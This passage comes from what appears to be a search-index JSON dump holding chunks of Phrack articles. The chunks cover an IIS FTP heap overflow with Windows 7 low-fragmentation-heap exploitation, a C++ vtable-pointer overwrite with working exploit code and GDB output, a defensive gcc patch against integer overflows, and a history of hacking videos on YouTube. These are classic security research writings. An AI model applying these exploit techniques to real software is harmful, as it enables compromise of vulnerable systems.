dsb->BufferBegin; char *start = dsb->BufferBegin; char *end = dsb->BufferEnd; int len = dsb->BufferLength; int iac_count = 0; if(begin + len == end) return 0; //do a total count of the IAC codes do { start++; if(*start == 0xFF) iac_count++; } while(start < end); if(!iac_count) return 0; for(char *c = begin; c != end; *begin++ = *c) { c++; if(*c == 0xFF) *begin++ == 0xFF; } return 0; } As you can see, if the function encounters a 0xFF that is NOT separated by at least 2-bytes then there is a potential to escape the code more than once, which will eventually lead to a heap corruption into adjacent memory based on the size of the request and amount of IAC codes. For example, if you were to send the string \"\\xFF\\xBB\\xFF\\xFF\\xFF\\xBB\\xFF\\xFF\" to the server, OnReceivedData produces the values: 1) Before OnReceivedData a. DSB->BufferLength = 8 b. DSB->Buffer = \"\\xFF\\xBB\\xFF\\xFF\\xFF\\xBB\\xFF\\xFF\" 2) After OnReceivedData a. DSB->BufferLength = 4 b. DSB->Buffer = \"\\xBB\\xFF\\xBB\\xFF\" Although OnReceivedData attempted to escape the IAC codes, it didn't expect to see multiple 0xFFs within a certain range; therefore writing the illegitimate values at an unacceptable range for OnSendData. Using the same string from above, OnSendData would write multiple 0xFF characters past the end of the buffer due to de-synchronization in the reading and writing into the same buffer. Now that it is known that a certain amount of 0xFF characters can be written past the end of the buffer, it is time to think about an exploitation strategy and gather primitives... --[ 4 - Exploitation Primitives Exploitation primitives can be thought of as the building blocks of exploit development. They can be as simple as program functionality that produces a desired result or as complicated as a 1-to-n byte overflow. The section will cover many of the primitives used within the exploit. In-depth knowledge of the underlying operating system usually proves to be invaluable information when writing exploits. This holds true for the IIS FTP exploit, as intricate knowledge of the Windows 7 Low Fragmentation Heap served as the basis for exploitation. It was decided that the FreeEntryOffset Overwrite Technique [2] would be used due to the limited ability of the attacker to control the contents of the overflow. The attack requires the exploiter to enable the low fragmentation heap, position a chunk under the exploiter's control before a free chunk (implied same size) within the same UserBlock, write at least 10 bytes past the end of its buffer, and finally make two subsequent requests that are serviced from the same UserBlock. [Yes, it's just that easy ;)] The following diagram shows how the FreeEntryOffset is utilized when making allocations. The first allocation comes from a virgin UserBlock, setting the FreeEntryOffset to the first two-byte value stored in the current free chunk. Notice there is no validation when updating the FreeEntryOffset. For MUCH more information on the LFH and exploitation techniques please see the references section: Allocation 1 FreeEntryOffset = 0x10 --------------------------------- |Header|0x10| Free | --------------------------------- |Header|0x20| Free | --------------------------------- |Header|0x30| Free | --------------------------------- Allocation 2 FreeEntryOffset = 0x20 --------------------------------- |Header| Used | --------------------------------- |Header|0x20| Free | --------------------------------- |Header|0x30| Free | --------------------------------- Allocation 3 FreeEntryOffset = 0x30 --------------------------------- |Header| Used | --------------------------------- |Header",
                      "hash": "3612dc9013fd73a537fc9dc12fe47eeca9eeee4950737edd0396c1bdd60b439d",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8208096623420715
                    }
                  ]
                },
                {
                  "created": 1679370780914,
                  "document_id": "phrack-56-8",
                  "timestamp": 947030400000,
                  "tags": ["phrack", "issue-56", "article-8"],
                  "hash": "5d8603583792eb54e3876e5d6001542be053ceea2c06a12019a5f3f0080f647a",
                  "text_size": 54865,
                  "chunk_count": 5,
                  "chunks": [
                    {
                      "text": " depends largely of the size of the buffer. A buffer of large size will be able to contain without problem a VTABLE and a shellcode, and then avoid all risks of segmentation faults. Let's remind ourselves that our objects are each time followed by a 4 bytes sequence (0x29, 0x49), and that we can without problems write our 00h (end of string) to the byte behind our VPTR. To check we are going to place our shellcode rightly before our VPTR. We are going to adopt the following structure in our buffer: +------(1)---<----------------+ | | | ==+= SSSS ..... SSSS .... B ... CVVVV0 ==+= =+== | | | | +----(2)--+->-------------+ Where: V represents bytes of the address of the beginning of our buffer. S represents bytes of the address of our shellcode, here the address of C (address S=address V+offset VPTR in the buffer-1 in this case, because we have placed our shellcode rightly before the VPTR). B represents the possible bytes of any value alignment (NOPs:), to align the value of our VPTR on the VPTR of the object. C represents the byte of the shellcode, in this case, a simple CCh byte (INT 3), that will provoke a SIGTRAP signal. 0 represents the 00h byte, that will be at the end of our buffer (for strcpy() function). The number of addresses to put in the beginning of our buffer (SSSS) depends if we know or not the index in the VTABLE of the 1st method that will be called after our overflow: Either we knows this index, and then we writes the corresponding pointer. Either we doesn't know this index, and we generate a maximum number of pointers. Then, we hope the method that will be executed will use one of those overwritten pointers. Notice that a class that contains 200 methods isn't very usual ;) The address to put in VVVV (our VPTR) depends principally of the execution of the program. It is necessary to note here that our objects were allocated on the heap, and that it is difficult to know exactly their addresses. We are going to write a small function that will construct us a buffer. This function will receive 3 parameters: - BufferAddress: the address of the beginning of the buffer that we will overflow. - NAddress: the number of addresses that we want in our VTABLE. Here is the code of our BufferOverflow() function: char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) { char *Buffer; unsigned long *LongBuffer; unsigned long CCOffset; int i; Buffer=(char*)malloc(VPTROffset+4); // allocates the buffer. CCOffset=(unsigned long)VPTROffset-1; // calculates the offset of the code to execute in the buffer. for (i=0;i<VPTROffset;i++) Buffer[i]='\\x90'; // fills the buffer with 90h (NOP, old habit:))) LongBuffer=(unsigned long*)Buffer; // constructs a pointer to place addresses in our VTABLE. for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset; // fills our VTABLE at the beginning of the buffer with the address of the // shellcode. LongBuffer=(unsigned long*)&Buffer[VPTROffset]; // constructs a pointeur on VPTR. *LongBuffer=BufferAddress; // value that will overwrite VPTR. Buffer[CCOffset]='\\xCC'; // our executable code. Buffer[VPTROffset+4]='\\x00'; // finishes by a 00h char (end string). return Buffer; } In our program we can now call our BufferOverflow() function, with as parameters: - the address of our buffer, here the address of our object (Object[0]). - 4 values in our VTABLE, in this case (since PrintBuffer() is in VTABLE+8+4). - 32 as offset for VPTR. Here is the resulting code (bo3.cpp): #include <stdio.h> #include <string.h> #include <malloc.h> class BaseClass { private: char Buffer[32]; public: void SetBuffer(char *String) { strcpy(Buffer,String); } virtual void PrintBuffer() { printf(\"%s\\n\",Buffer); } }; class MyClass1:public BaseClass { public: void PrintBuffer() { printf(\"MyClass1: \"); BaseClass::PrintBuffer(); } }; class MyClass2:public BaseClass { public: void PrintBuffer() { printf(\"MyClass2: \"); BaseClass::PrintBuffer(); } }; char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) { char *Buffer; unsigned long *LongBuffer; unsigned long CCOffset; int i; Buffer=(char*)malloc(VPTROffset+4+1); CCOffset=(unsigned long)VPTROffset-1; for (i=0;i<VPTROffset;i++) Buffer[i]='\\x90'; LongBuffer=(unsigned long*)Buffer; for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset; LongBuffer=(unsigned long*)&Buffer[VPTROffset]; *LongBuffer=BufferAddress; Buffer[CCOffset]='\\xCC'; Buffer[VPTROffset+4]='\\x00'; return Buffer; } void main() { BaseClass *Object[2]; Object[0]=new MyClass1; Object[1]=new MyClass2; Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]),4,32)); Object[1]->SetBuffer(\"string2\"); Object[0]->PrintBuffer(); Object[1]->PrintBuffer(); } We compile, and we launch GDB: rix@pentium:~/BO > gcc -o bo3 bo3.cpp rix@pentium:~/BO > gdb bo3 ... (gdb) disass main Dump of assembler code for function main: 0x8048670 <main>: pushl %ebp 0x8048671 <main+1>: movl %esp,%ebp 0x8048673 <main+3>: subl $0x8,%esp 0x8048676 <main+6>: pushl %edi 0x8048677 <main+7>: pushl %esi 0x8048678 <main+8>: pushl %ebx 0x8048679 <main+9>: pushl $0x24 0x804867b <main+11>: call 0x80488c0 <___builtin_new> 0x8048680 <main+16>: addl $0x4,%esp 0x8048683 <main+19>: movl %eax,%eax 0x8048685 <main+21>: pushl %eax 0x8048686 <main+22>: call 0x8048760 <__8MyClass1> 0x804868b <main+27>: addl $0x4,%esp 0x804868e <main+30>: movl %eax,%eax 0x8048690 <main+32>: movl %eax,0xfffffff8(%ebp) 0x8048693 <main+35>: pushl $0x24 0x8048695 <main+37>: call 0x80488c0 <___builtin_new> 0x804869a <main+42>: addl $0x4,%esp 0x804869d <main+45>: movl %eax,%eax 0x804869f <main+47>: pushl %eax 0x80486a0 <main+48>: call 0x8048730 <__8MyClass2> 0x80486a5 <main+53>: addl $0x4,%esp 0x80486a8 <main+56>: movl %eax,%eax ---Type <return> to continue, or q <return> to quit--- 0x80486aa <main+58>: movl %eax,0xfffffffc(%ebp) 0x80486ad <main+61>: pushl $0x20 0x80486af <main+63>: pushl $0x4 0x80486b1 <main+65>: movl 0xfffffff8(%ebp),%eax 0x80486b4 <main+68>: pushl %eax 0x80486b5 <main+69>: call 0x80485b0 <BufferOverflow__FUlii> 0x80486ba <main+74>: addl $0xc,%esp 0x80486bd <main+77>: movl %eax,%eax 0x80486bf <main+79>: pushl %eax 0x80486c0 <main+80>: movl 0xfffffff8(%ebp),%eax 0x80486c3 <main+83>: pushl %eax 0x80486c4 <main+84>: call 0x8048790 <SetBuffer__9BaseClassPc> 0x80486c9 <main+89>: addl $0x8,%esp 0x80486cc <main+92>: pushl $0x80489f6 0x80486d1 <main+97>: movl 0xfffffffc(%ebp),%eax 0x80486d4 <main+100>: pushl %eax 0x80486d5 <main+101>: call 0x8048790 <SetBuffer__9BaseClassPc> 0x80486da <main+106>: addl $0x8,%esp 0x80486dd <main+109>: movl 0xfffffff8(%ebp),%eax 0x80486e0 <main+112>: movl 0x20(%eax),%ebx 0x80486e3 <main+115>: addl $0x8,%ebx 0x80486e6 <main+118>: movswl (%ebx),%eax 0x80486e9 <main+121>: movl %eax,%edx 0x80486eb <main+123>: addl 0xfffffff8(%ebp),%edx ---Type <return> to continue, or q <return> to quit--- 0x80486ee <main+126>: pushl %edx 0x80486ef <main+127>: movl 0x4(%ebx),%edi 0x80486f2 <main+130>: call *%edi 0x80486f4 <main+132>: addl $0x4,%esp 0x80486f7 <main+135>: movl 0xfffffffc(%ebp),%eax 0x80486fa <main+138>: movl 0x20(%eax),%esi 0x80486fd <main+141>: addl $0x8,%esi 0x8048700 <main+144>: movswl (%esi),%eax 0x8048703 <main+147>: movl %eax,%edx 0x8048705 <main+149>: addl 0xfffffffc(%ebp),%edx 0x8048708 <main+152>: pushl %edx 0x8048709 <main+153>: movl 0x4(%esi),%edi 0x804870c <main+156>: call *%edi 0x804870e <main+158>: addl $0x4,%esp 0x8048711 <main+161>: xorl %eax,%eax 0x8048713 <main+163>: jmp 0x8048720 <main+176> 0x8048715 <main+165>: leal 0x0(%esi,1),%esi 0x8048719 <main+169>: leal 0x0(%edi,1),%edi 0x8048720 <main+176>: leal 0xffffffec(%ebp),%esp 0x8048723 <main+179>: popl %ebx 0x8048724 <main+180>: popl %esi 0x8048725 <main+181>: popl %edi 0x8048726 <main+182>: movl %ebp,%esp 0x8048728 <main+184>: popl %ebp ---Type <return> to continue, or q <return> to quit--- 0x8048729 <main+185>: ret 0x804872a <main+186>: leal 0x0(%esi),%esi End of assembler dump. Next, we install a breakpoint in 0x8048690, to get the address of our 1st object. (gdb) break *0x8048690 Breakpoint 1 at 0x8048690 And finally, we launch our program: (gdb) run Starting program: /home/rix/BO/bo3 Breakpoint 1, 0x8048690 in main () We read the address of our 1st object: (gdb) info reg eax eax: 0x8049b38 134519608 Then we pursue, while hoping that all happens as foreseen... :) Continuing. Program received signal SIGTRAP, Trace/breakpoint trap. 0x8049b58 in ?? () We receive a SIGTRAP well, provoked by the instruction preceding the 0x8049b58 address. However, the address of our object was 0x8049b38. 0x8049b58-1-0x8049b38=0x1F (=31), which is exactly the offset of our CCh in our buffer. Therefore, it is well our CCh that has been executed!!! You understood it, we can now replace our simple CCh code, by a small shellcode, to get some more interesting results, especially if our program bo3 is suid... ;) Some variations about the method ================================ We have explain here the simplest exploitable mechanism. Other more complex cases could possibly appear... For example, we could have associations between classes like this: class MyClass3 { private: char Buffer3[32]; MyClass1 *PtrObjectClass; public: virtual void Function1() { ... PtrObjectClass1->PrintBuffer();",
                      "hash": "00ed2be6299a55953f92870ffb227af786fc8c3f87ba74860c17138280cc774e",
                      "offset": 2,
                      "vector": null,
                      "score": 0.8172733783721924
                    }
                  ]
                },
                {
                  "created": 1679370877212,
                  "document_id": "phrack-60-9",
                  "timestamp": 1041033600000,
                  "tags": ["phrack", "issue-60", "article-9"],
                  "hash": "5ffce4d19e2513c7d2d2b6531720640fef20e12213320ae732ca4c9c0c0efc42",
                  "text_size": 58337,
                  "chunk_count": 5,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3c, Phile #0x09 of 0x10 |=-------------------=[ Big Loop Integer Protection]=------------------=| |=---------------------------------------------------------------------=| |=--------------=[ Oded Horovitz ohorovitz@entercept.com ]=------------=| --[ Contents 1 - Introduction 2 - Part I - Integer problems 2.1 - Introduction 2.2 - Basic code samples 3 - Part II - Exploitation pattern 3.1 - One input, two interpretations 3.2 - What is the nature of the input? 3.3 - Suggested detection 4 - Part III - Implementation 4.1 - Introduction 4.2 - Why gcc? 4.3 - A bit about gcc 4.3.1 - Compilation flow 4.3.2 - The AST 4.3.3 - Getting started 4.4 - Patch Goals 4.5 - Patch overview 4.5.1 - Tactics 4.5.2 - Modifying the AST 4.6 - Limitations 5 - References 6 - Thanks 7 - Appendix A - Real life examples 7.1 - Apache Chunked encoding 7.2 - OpenSSH auth 8 - Appendix B - Using blip --[ 1 - Introduction Integer overflow and integer sign vulnerabilities are now common knowledge. This has led to increased exploitation of integer-related vulnerabilities. The article will attempt to suggest a way to detect these vulnerabilities by adding compiler support that detects and flags integer vulnerabilities exploitations. Specifically a gcc patch is presented to demonstrate the feasibility of this technique. The article is divided into three parts. Part one contains a brief introduction to some of the common integer related vulnerabilities. We list some of the recent public vulnerabilities. Part two of the article tries to explain the root cause of the problem with integer vulnerabilities. Using real examples, the article explains why exploitation is possible in the first place, and how it may be possible to detect exploitation of integer vulnerabilities, even when the vulnerability is not known in advance. Part three goes through the implementation of the suggested detection scheme. Since the implementation of this detection scheme is in the form of a gcc patch, introduction information about gcc internals is provided as well. We summarize the paper by demonstrating the protection at work against OpenSSH and the Apache httpd packages. --[ 2 - Part I - Integer problems ----[ 2.1 - Introduction In the last year the attention seems to have shifted to a new bad programming practice. This practice is related to the possibility to integer overflows that cause buffer overflows. It turns out the many popular and (assumed to be) secure software packages (OpenSSH, Apache, *BSD kernel) share this vulnerability. The root cause for this bad practice is insufficient input validation for integer type input. Integer input looks so naive, only a few bits long. What can go wrong here? Well, it seems that quite a lot can go wrong. The following is a table of integer related vulnerabilities taken from the OpenBSD and FreeBSD security lists. All vulnerabilities have been reported during year 2002. ------------------------------------------------------------------------- | Vulnerable package | Short description of vulnerability | ------------------------------------------------------------------------- | OpenBSD select syscall | Positive limit checks against int value | | (See reference [4]) | allowing stack overflow | ------------------------------------------------------------------------- | RPC xdr_array | Int overflow cause small buffer allocation | | | which later overflowed with input | ------------------------------------------------------------------------- | OpenSSH Authentication | Int overflow cause small buffer allocation | | | which later overflowed with input | ------------------------------------------------------------------------- | Apache chunked-encoding| Positive condition is done on signed int | | | allowing heap overflow | ------------------------------------------------------------------------- | FreeBSD get_pallette | Positive condition is done on signed int | | | allowing information leak from kernel to user| ------------------------------------------------------------------------- | FreeBSD accept1,getsoc-| Positive condition is done on signed int | | kname1,getpeername1 | allowing information leak from kernel to user| ------------------------------------------------------------------------- Table 1 - Sample integer vulnerabilities in year 2002. The common problem that exists in all of the above vulnerabilities is that an input of integer type (signed and unsigned) was used to trigger overflow (when writing) or info leak (when reading) to/from program buffers. All of the above vulnerabilities would have been prevented if proper limits had been enforced. ----[ 2.2 - Basic code samples Integer vulnerabilities can be further illustrated by looking at the following two simple code samples. Example 1 (int overflow): ------------------------- 01 int main(int argc,char* argv[]){ 02 unsigned int len,i; 03 char *buf; 04 if(argc != 3) return -1; 05 len=atoi(argv[1]); 06 buf = (char*)malloc(len+1); 07 if(!buf){ 08 printf(\"Allocation faild\\n\"); 09 return -1; 10 } 11 for(i=0; i < len; i++){ 12 buf[i] = _toupper(argv[2][i]); 13 } 14 buf[i]=0; 15 printf(\"%s\\n\",buf); 16 } The code above seems quite legit. The program converts a string to its upper case representation. First it allocates enough space for the string and the NULL termination character. Then it converts each character into its upcase value. But when looking a bit closer, we can identify two major problems in the code. First, the program trusts the user to have as much characters as he specifies (which is obviously not the case)(line 5). Second, the program doesn't take into account that by calculating the space to allocate, an integer overflow may occur (line 6). Trying to generalize the problem, the first bug may allow the attacker to read information, which he didn't provide (by trusting the user input and reading *len* chars from argv[2]). The second bug allows the attack to overflow the heap with its own data, and therefore to fully compromise the program. Example 2 (sign check-bypass): ------------------------------ 01 #define BUF_SIZE 10 02 int max = BUF_SIZE; 03 int main(int argc,char* argv[]){ 04 int len; 05 char buf[BUF_SIZE]; 06 if(argc != 3) return -1; 07 len=atoi(argv[1]); 08 if(len < max){ 09 memcpy(buf,argv[2],len); 10 printf(\"Data copied\\n\"); 11 } 12 else 13 printf(\"Too much data\\n\"); 14 } The second example shows a program that had the intention to solve the problem introduced in the first example, by attempting to enforce user input length to a known and predefined maximum value. The problem in this code is that len is defined as a signed int. In this case a very big value (unsigned wise) is interpreted as a negative value (line 8), which will bypass the limit check. Still, in line 9 the same value is interpreted as an unsigned positive number causing a buffer overflow and possibly allowing a full compromise. --[ 3 - Part II - Exploitation pattern ----[ 3.1 - One input, two interpretations So what is the real problem? How come such security-oriented packages have these vulnerabilities? The answer is that integer inputs sometimes have an ambiguous interpretation at different parts of the code (integer may change their sign at different values, implicit type cast, integer overflows). That ambiguous interpretation is hard to notice when implementing input validation code. To explain this ambiguity let us look at the first example. At the time of allocation (line 6), the code believes that since the input is a number, then adding another number will yield a bigger number (len+1). But since typical C language programs ignore integer overflows the particular number 0xffffffff do not apply to this assumption and yields unexpected result (zero). Unfortunately the same error is *NOT* repeated later in the code. Therefore the same input 0xffffffff this time interpreted as an unsigned value (a huge positive number). In the second example the ambiguity of the input is even more obvious. Here the code includes a silent type casting generated by the compiler when calling memcpy. The code therefore is checking the value of the input as if it was a signed number (line 8) while using it to copy data as if it was an unsigned (line 9). This ambiguity is invisible for the coder eye, and may go undetected, leaving the code vulnerable to this \"stealthy\" attack. ----[ 3.2 - What is the nature of the input? Looking back at the above examples reveal a common meaning for the attacker input. (Sorry if the next few lines will explain the obvious :>) The above input is a number for a reason. It is a counter! It counts items! It doesn't matter what those \"items\" are (bytes, chars, objects, files, etc.). They are still countable amount of items. And what can you do with such a counter? Well, you are most likely to do some processing \"count\" amount of times. As a note I will say that not *every* number is also a counter. There are many other reasons to have numbers around. But the one that are related to integer vulnerabilities happend to be \"counters\" most of the time. For example, if the count is for challenge response you may want to read \"count\" amount of responses (OpenSSH). Or if the count is buffer length you may want to copy \"count\" amount of bytes from one memory location to the other (Apache httpd). The bottom line is that somewhere behind this number there is the proper \"loop\" in the code that will do some processing, \"count\" number of times. This \"loop\" may have multiple forms such as the for-loop in the first example, or as an implicit loop in memcpy. Still all loop flavors will end up looping around the \"count\". ----[ 3.3 - Suggested detection Ok, what do we have so far about those vulnerabilities? - The input was ambiguously used in the code. - Somewhere in the code there is a loop that uses the input integer as an iteration counter. To make the interpretation of the number ambiguous, the attacker has to send a huge number. Looking at the first example we can see that in order to make the number ambiguous the attacker needed to send such a big number that if doing (len+1) the number will overflow. For that to happen the attacker will have to send the value 0xffffffff. Looking at the second example, in order to make the interpretation of the number ambiguous, the attacker needs to send such a number that will fall into the negative range of an integer 0x80000000-0xffffffff. The same huge number sent by the attacker to trigger the vulnerability is later used in a loop as the iterations counter (As discussed in the section \"What is the nature of the input?\") Now lets analyze the exploit process: 1. Attacker wants to overflow buffer. 2. Attacker may use integer vulnerability 3. Attacker sends a huge integer to trigger the vulnerability. 4. Count loop executes (probably) using attacker input as the loop bound. 5. A Buffer is overflowed (On early iterations of the loop!) Therefore detecting (and preventing) integer vulnerability exploitation is possible by validating the loop bounds before its execution. The validation of the loop will check that the loop limit is not above a predefined threshold, and if the limit is higher that the threshold a special handler will be triggered to handle the possible exploitation. Since the value required to trigger most integer vulnerabilities is huge, we can assume (hope) that most legitimate loops will not trigger this protection. To get a feeling for what values we expect to see in integer Vulnerabilities, lets examine the following samples: - Allocating buffer for user data + program data Looks like: buf = malloc(len + sizeof(header)); In this case the value required for triggering int overflow is very close to 0xffffffff since most program struct sizes are in the range of several bytes to hundreds bytes at most. - Allocating arrays looks like: buf = malloc(len * sizeof(object)); In this case the value required for triggering the overflow may be much smaller then in the first example but it is still a relatively huge value. For example if sizeof(object) == 4 then the value should be bigger then 0x40000000 (one Giga). Even if the sizeof(object)== 64 the value should be bigger then 0x4000000 (64 Mega) in order to cause an overflow. - Falling to negative range In this case the value required to make a number negative is any number bigger then 0x7fffffff. Looking at the values required to trigger the integer vulnerability, we can choose a threshold such as 0x40000000 (One Giga) that will handle most cases. Or we can select smaller threshold for better protection, which may trigger some false positives. --[ 4 - Part III - Implementation ----[ 4.1 - Introduction Once we have a suggested a way to detect integer attacks, it will be nice to implement a system based on that idea. A possible candidate for implementing this system is to extend an existing compiler. Since the compiler knows about all loops in the application, it will be possible for the compiler to add the appropriate security checks before any \"count loop\". Doing so will secure the application without any knowledge of the specific vulnerability. Therefore I choose to implement this system as a gcc patch and name it \"Big Loop Integer Protection\" a.k.a blip. Using the -fblip flag one may now be able to protect his application from the next yet to be public integer exploit. ----[ 4.2 - Why gcc? Choosing gcc was not a tough decision. First this compiler is one of the most common compilers in the Linux, *nix world. Therefore, patching gcc will allow protecting all applications compiled with gcc. Second, the gcc is open-source therefore it may be feasible to implement this patch in the first place. Third, previous security patches were implemented as gcc patches (StackGaurd, ProPolice).So why not follow their wisdom? ----[ 4.3 - A bit about gcc Well.., all happy I set down knowing that I'm about to make a gcc patch for preventing integer attacks. But, except of that, what do I really know about gcc at all? I must admit that the answer for that question was - \"not much\". To overcome this little problem, I was looking for some documentation about gcc internals. I also hoped to find something similar to what I wanted to do, which already exists. Fast enough, it was clear that before jumping to other examples, I must understand the gcc beast. .. Two weeks later, I have read enough of the gcc internal documentation, and I spent enough time in debugging sessions of the compiler, to be able to",
                      "hash": "7dbfbb20efdf2183a14f298d814ba428f941b6cdccf32c932376cf04ee32cb7f",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8165990710258484
                    }
                  ]
                },
                {
                  "created": 1679371189332,
                  "document_id": "phrack-70-15",
                  "timestamp": 1633392000000,
                  "tags": ["phrack", "issue-70", "article-15"],
                  "hash": "4caab1c3db0e2732f2cd7d94702e46cd53dd78857999d48445229cd5ebf73893",
                  "text_size": 19122,
                  "chunk_count": 2,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x10, Issue 0x46, Phile #0x0f of 0x0f |=-----------------------------------------------------------------------=| |=---------------------=[ YouTube Security Scene ]=----------------------=| |=-----------------------------------------------------------------------=| |=--------------------------=[ LiveOverflow ]=---------------------------=| |=-----------------------------------------------------------------------=| --[ Table of Contents 0. About the Author 1. Preamble 2. Before 2014 3. My Start in 2015 4. Today's Scene 5. Final Words 6. References --[ 0. About the Author To briefly introduce myself, I'm LiveOverflow and I make videos about various IT security topics. Here are a few: + How SUDO on Linux was HACKED! // CVE-2021-3156 https://youtu.be/TLa2VqcGGEQ?list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx + XSS on Google Search - Sanitizing HTML in The Client? https://www.youtube.com/watch?v=lG7U3fuNw3A + Identify Bootloader main() and find Button Press Handler https://youtu.be/yJbnsMKkRUs?list=PLhixgUqwRTjyLgF4x-ZLVFL-CRTCrUo03 --[ 1. Preamble From BBS and text files, over IRC and books, to the modern internet with forums and blogs, hackers exchanged information primarily in text form. This of course meant, most older hackers prefer text, which makes it difficult to establish new kinds of media. When I started producing videos in 2015 I often got the feedback that text is superior, nobody will watch videos and I should instead write articles. So when I was asked to write about the \"YouTube Hacking Scene\" for Phrack I felt like video production finally reached some level of acceptance. While this article is titled \"YouTube Hacking Scene\" I also want to include streamers on Twitch and other platforms - who knows how long the product YouTube will survive, and I'm sure Phrack will exist long after. Given that my personal experience is biased and the history is difficult to research, this article is certainly not objective. So we will go with the French saying \"preach the falsehood to know the truth\". So if you know it better, please reach out. --[ 2. Before 2014 Digging up information about hacking videos from the early 2000s is difficult, but it's clear that it was not very popular. Personally I remember \"Lenas Reversing for Newbies\"[0] video series from 2006 very well, but it wasn't distributed via YouTube. It is an incredibly detailed and hands-on walkthrough of Windows reverse engineering and cracking with OllyDbg. I have seen it getting recommended a lot over years, indicating that there is a craving for the visual teaching approach. One of the earliest hacking show attempts seems to be \"the broken\" by Kevin Rose from 2003[1]. Then in 2005 Darren Kitchen started the Hak5 show[2] and it deserves a mention, as it is probably the longest running hacking video production. YouTube already existed when it started, but it wasn't popular just yet, so the distribution heavily relied on torrents. Notable might also be IronGeek, who started uploading conference videos on YouTube in 2007. His trip to Notacon 2007 might be the first ever \"Hacking Vlog\"[3]. But all of these video projects were mostly just scratching the surface of hacking. Very few videos were actually digging into the technical details. In 2007 the project SecurityTube started out of India by vivekramac. Probably inspired by YouTube it was meant as a place for everybody to upload and share hacking video content, but vivekramac himself was responsible for creating tons of videos. For many years it seems to have been the best source for free video courses. But in 2011 the site slowly transitioned into the new paid courses platform Pentester Academy. Fun fact, when I started making videos in 2015 I obviously came across SecurityTube and I tried to submit my videos there, but they were never accepted. The platform already felt abandoned, and the content was kinda outdated and not the depth I was looking for anyway. Nonetheless a very important part of video creator history. Over the years I have been collecting YouTube channels with more or less technical security content. And to create the chart below (Fig. 1), I looked at the year of their first relevant upload. Also most of those channels only have a handful of videos and were abandoned shortly after. But in hindsight I even noticed there were a few very early attempts at making more technical video walkthroughs such as lordparody (2009)[4]. Looking at the data there appears to have been a small surge after 2010, but I think that 2015 was where the current hacker creator scene really started growing. 2005: * 2006: 2007: ** 2008: * 2009: ***** 2010: **** 2011: ******* 2012: ************ 2013: ********* 2014: ****** 2015: *************** 2016: ************************** 2017: **************************** 2018: ********************* 2019: ************ 2020: ********************* Fig 1. Bar chart showing the numbers of new hacking YouTube creators by year --[ 3. My Start in 2015 Around 2014 I started to hit a wall in my own learning progress. There were tons of (written) tutorials about web security, WiFi hacking, Metasploit and buffer overflows, but the material mostly covered basics. To actually learn more advanced topics I had to play wargames[6] and CTFs. I remember fondly struggling for months playing w3challs or io.smashthestack to improve very very slowly - I was a classic annoying noob, even getting banned by bla from IRC ;) I believe it shouldn't have been this difficult to progress. In the traditional academic science community you rely on papers, to build upon prior research. And while we have equivalent resources, see for example Phrack, we are missing the educational institutions like universities to pass on this knowledge more effectively. So in the past, new people had to walk a very stony path to catch up with the state-of-the-art. After I finally \"understood\" ret2libc and ROP, I felt like that this stuff is actually easy, but the existing material is just bad at explaining it. Then in late 2014, early 2015, two events happened that would have a big impact on me. The first event was the growing community of programmers on reddit called /r/WatchPeopleCode[7] - a subreddit about live streaming programming. While it is not about security, everybody knows that programming skills are crucial if you do any form of more in-depth hacking. The second event was geohot livestreaming himself solving pwnable challenges from overthewire.org[8]. What both of these events have in common is that it's the first time for me looking over the shoulder of a professional. I realized that all the talks, blog posts and articles only cover the results, and rarely the actual process. And because I was not lucky enough to have people around me to learn from in person, watching over the shoulder of an experienced developer, or geohot, was eye opening. To see how geohot was using the terminal, writing exploit scripts and navigating IDA Pro was incredibly insightful. But more importantly, it also exposed the fails and mistakes followed by the process of troubleshooting and fixing the bugs. And this pushed me through the wall I was hitting in my own education. I was craving more. Where can I find more streams or videos where people are hacking? Unfortunately, when searching on YouTube, the only videos I could find were either Metasploit tutorials or how to use aircrack-ng to hack a WiFi. And these topics were very boring to me as I was more interested in the process of finding these kinds of flaws, rather than just using what others found. Of course I was very far away from geohot's skills, I did understand ROP and I thought I could create the \"over the shoulder\" experience for the people coming after me. Which led me to start livestreaming pwnable challenges[9] from exploit-exercises.com (today exploit.education), and cover other CTFs. However I quickly noticed that I was terrible at streaming and soon transitioned into making scripted videos with a focus on visual explanations[10]. Another realization I had was, in fact, I did not understand ROP and other topics properly. So having the aspiration to create better tutorials, it forced me to dig deeper, which meant this project benefited my own education too. Of course this is me talking from my own perspective and I don't want to make it sound like I was the only one. I simply wanted to provide insight on what motivations can lead people to create videos. So at this point I would like to mention a few other folks who were making videos about more \"advanced\" topics around that time. Gynvael from the Dragon Sector CTF team[11], MurmusCTF[12], ipp[13], psifertex[14], Zeta Two[15] and probably many more I unfortunately never came across. Making good videos is very time consuming, especially once it's more than \"just\" a screen recording or livestream. So very few creators are able to do it over a longer period of time and I believe John Hammond[16] and I have the longest and consistently running release schedule. --[ 4. Today's Scene As has been the case with any area of hacking, commercialization also creeps into this scene. I'm not immune to this either, as the time investment is massive and has to be justified somehow. This unfortunately leads to videos that are sometimes more motivated by exposure or products, rather than the pure sharing of knowledge; and it's difficult to find a balance between those opposing forces. It also led to the prior generation of free video content (SecurityTube, Cybrary, ...) to put their content behind paywalls. But there is one amazing positive commercial development that I want to highlight. In the past years companies like Google have sponsored very technical videos[17] to share insights into vulnerabilities of their own products. Who would have thought this could ever happen, when this community used to be scared to get sued for anything. There are also new problems that come with Google/YouTube and the other large social media platforms. YouTube for example has a policy against certain kinds of hacking videos[18], which lead to the take down of several videos and even entire channels. However it should also be noted 99% of the time it was a clear mistake and the decisions got reversed. \"Hacking: Demonstrating how to use computers or information technology with the intent to steal credentials, compromise personal data or cause serious harm to others such as (but not limited to) hacking into social media accounts.\" - YouTube's harmful or dangerous content policies Can hacking videos be ethical or unethical? It's a difficult topic and one that I clash a lot on with other creators. I do believe that there is a way to make the \"right\" kind of tutorials - and so far I haven't had any issues with YouTube ;) For example, I understand that Google does not want a step-by-step video guide for script kiddies to setup a shitty phishing page, when phishing is the second most common source of compromised Google accounts[19]. And to me that is not 